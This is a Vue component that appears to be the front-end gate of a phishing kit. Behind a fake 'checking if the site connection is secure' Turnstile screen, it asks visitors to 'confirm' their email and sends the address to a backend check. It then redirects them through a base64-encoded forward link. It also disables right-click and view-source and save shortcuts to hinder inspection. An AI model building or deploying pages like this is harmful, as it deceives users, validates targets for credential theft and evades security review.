<template>
  <div v-if="!captchaToken" class="gate-container">
    <main>
      <div class="instructions">
        <p>Please stand by while we are checking if the site connection is secure.</p>
        <div class="cf-turnstile" data-sitekey="0x4AAAAAABgei6QZruCN7n08"></div>
      </div>
    </main>
  </div>

  <div v-else class="background">
    <div class="toto-container">
      <div class="header">
        <div class="logo-text">
          <span class="success-check">⼈</span>
        </div>
      </div>

      <div class="content">
        <p><strong>Please confirm your email address to continue.</strong></p>

        <div class="form-wrapper">
          <label for="honeypot" class="visually-hidden">Do not fill this field (anti-bot)</label>
          <input
            id="honeypot"
            v-model="honeypot"
            type="text"
            tabindex="-1"
            autocomplete="off"
            aria-hidden="true"
            class="visually-hidden"
          />

          <label for="email" class="visually-hidden">Email address</label>
          <input
            id="email"
            v-model="email"
            type="email"
            placeholder="Enter your email"
            required
            class="email-input"
            :disabled="loading"
          />

          <p v-if="error" class="error" role="alert" aria-live="polite">{{ error }}</p>

          <button @click="submitForm" :disabled="loading" class="action-button">
            {{ loading ? 'Submitting…' : 'Submit' }}
          </button>
        </div>
      </div>

      <div class="divider"></div>

      <div class="footer-container">
        <p class="footer-text">
          © 2025 All rights reserved.
          <a href="/privacy" target="_blank">Privacy Policy</a> |
          <a href="/terms" target="_blank">Terms</a>
        </p>
      </div>
    </div>
  </div>
</template>

<script setup>
import { ref, onMounted, nextTick } from 'vue'

const email = ref('')
const honeypot = ref('')
const error = ref('')
const loading = ref(false)
const captchaToken = ref(null)

onMounted(async () => {
  await nextTick()

  // Disable right-click and developer shortcuts
  document.addEventListener('contextmenu', e => e.preventDefault())
  document.addEventListener('keydown', e => {
    if (e.ctrlKey && ['u', 's', 'p', 'Shift'].includes(e.key)) {
      e.preventDefault()
    }
  })

  // Render Cloudflare Turnstile
  if (window.turnstile) {
    window.turnstile.render('.cf-turnstile', {
      sitekey: '0x4AAAAAABgei6QZruCN7n08',
      callback: token => {
        captchaToken.value = token
      },
    })
  }
})

async function submitForm() {
  error.value = ''
  loading.value = true

  try {
    const res = await fetch(`${import.meta.env.VITE_API_BASE}/api/check-email`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        email: email.value,
        captchaToken: captchaToken.value,
        middleName: honeypot.value
      })
    })

    const data = await res.json()
    if (!res.ok || !data.valid) {
      throw new Error(data.message || 'Verification failed')
    }

    if (data.redirectUrl) {
      const encoded = btoa(data.redirectUrl)
      window.location.href = `${import.meta.env.VITE_API_BASE}/forward?data=${encoded}`
    }
  } catch (err) {
    error.value = err.message
  } finally {
    loading.value = false
  }
}
</script>

<style scoped>
.visually-hidden {
  position: absolute !important;
  height: 1px;
  width: 1px;
  overflow: hidden;
  clip: rect(1px, 1px, 1px, 1px);
  white-space: nowrap;
}

html, body {
  height: 100vh;
  margin: 0;
  padding: 0;
  overflow: hidden;
  font-family: Arial, sans-serif;
  background-color: #FAF9F6;
  color: #000;
}

body {
  display: block;
}

.background,
.gate-container {
  position: fixed;
  top: 0;
  left: 0;
  height: 100vh;
  width: 100vw;
  display: flex;
  flex-direction: column;
  justify-content: flex-start;
  align-items: center;
  padding-top: 100px;
  background-color: #FAF9F6;
}

.cf-turnstile {
  transform: scale(0.9);
  transform-origin: center;
  height: auto !important;
  width: auto !important;
}

.instructions {
  text-align: center;
  max-width: 500px;
  padding: 1rem;
}

.toto-container {
  width: 100%;
  max-width: 600px;
  background: #fff;
  border-radius: 10px;
  box-shadow: 0 1px 20px rgba(0, 0, 0, 0.1);
  padding: 4rem;
  display: flex;
  flex-direction: column;
  justify-content: center;
  height: 50vh;
}

.header {
  display: flex;
  justify-content: center;
  margin-bottom: 1rem;
}

.logo-text {
  font-weight: bold;
  display: flex;
  align-items: center;
  gap: 1rem;
}

.success-check {
  font-size: 2rem;
  color: red;
  line-height: 1;
}

.content {
  text-align: center;
}

.form-wrapper {
  display: flex;
  flex-direction: column;
  align-items: center;
}

.email-input {
  width: 95%;
  max-width: 400px;
  padding: 0.6rem;
  border: 1px solid #818181;
  border-radius: 5px;
  font-size: 1rem;
  background-color: #fff;
  color: #000;
}

.action-button {
  background-color: transparent;
  color: #0078D4;
  padding: 0.6rem 1.5rem;
  border: 1.5px solid #0078D4;
  border-radius: 16px;
  cursor: pointer;
  margin-top: 1rem;
  font-size: 1rem;
  width: 50%;
  max-width: 380px;
}

.action-button:disabled {
  opacity: 0.6;
  cursor: default;
}

.action-button:hover:not(:disabled) {
  background-color: transparent;
}

.divider {
  height: 0;
  background-color: #e0e0e0;
  margin: 1rem 0;
}

.footer-container {
  text-align: center;
}

.footer-text {
  font-size: 0.85rem;
  color: #333;
  margin-top: 0.5rem;
}

.error {
  color: red;
  font-size: 0.9rem;
  margin-top: 0.6rem;
}

/* Dark mode */
@media (prefers-color-scheme: dark) {
  html, body,
  .background,
  .gate-container {
    background-color: #121212;
    color: #ffffff;
  }

  .instructions,
  .toto-container {
    color: #ffffff;
  }

  .toto-container {
    background: #1e1e1e;
    box-shadow: 0 1px 20px rgba(255, 255, 255, 0.05);
  }

  .email-input {
    background-color: #2b2b2b;
    border-color: #444;
  }

  .footer-text {
    color: #aaaaaa;
  }

  .error {
    color: #ff6b6b;
  }
}
</style>
